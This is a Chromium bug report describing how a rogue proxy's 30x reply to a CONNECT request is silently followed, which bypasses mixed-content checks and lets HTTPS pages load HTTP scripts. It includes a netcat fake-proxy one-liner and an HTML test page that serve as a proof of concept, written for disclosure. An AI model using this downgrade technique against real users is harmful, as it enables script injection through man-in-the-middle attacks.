<title>Issue 7338 -   chromium -    30x redirects silently honored in response to CONNECT - Project Hosting on Google Code</title> <pre> So I think we meant to block loading http:// scripts and similar  subresources from https:// pages  but we were alerted to at least one  corner case: if the user has proxy auto-configuration enabled  or a  forgotten proxy  and is on a rogue network that has a malicious proxy doing  MITM attacks - then if a CONNECT request is sent by Chrome to the proxy   and a HTTP 30x response is generated  the redirect is silently followed   and no mixed content checks are carried out.    To demo:    1) Set up a fake one-shot proxy on your machine: echo -e 'HTTP/1.0 302  RedirectnLocation: http://[internal  WWW]/~lcamtuf/js_downgrade.jsnConnection: closenn' | nc -l -p 1234 (use  Cygwin on Windows)     2) Configure your browser to use localhost:1234 as a proxy for HTTPS     3) Add [internal WWW] and [CRL serving host] to the list of exceptions in  proxy config.     4) Open the following HTML in the browser  over https://:    -- snip! --  &lt;script&gt;  var loaded_ok = false;  setTimeout('check_result()' 2000);    function check_result() {    if (loaded_ok) alert('HTTPS -&gt; HTTP proxy downgrade worked (if no  warnings shown)');     else alert('HTTPS -&gt; HTTP proxy downgrade did not work');  }  &lt;/script&gt;    &lt;script src=&quot;<a href="https://www.example.com/dummy.js">https://www.example.com/dummy.js</a>&quot;&gt;  &lt;/script&gt;  -- snip! --    An internal test is at:    https://[internal WWW]/~lcamtuf/js_downgrade.html   </pre>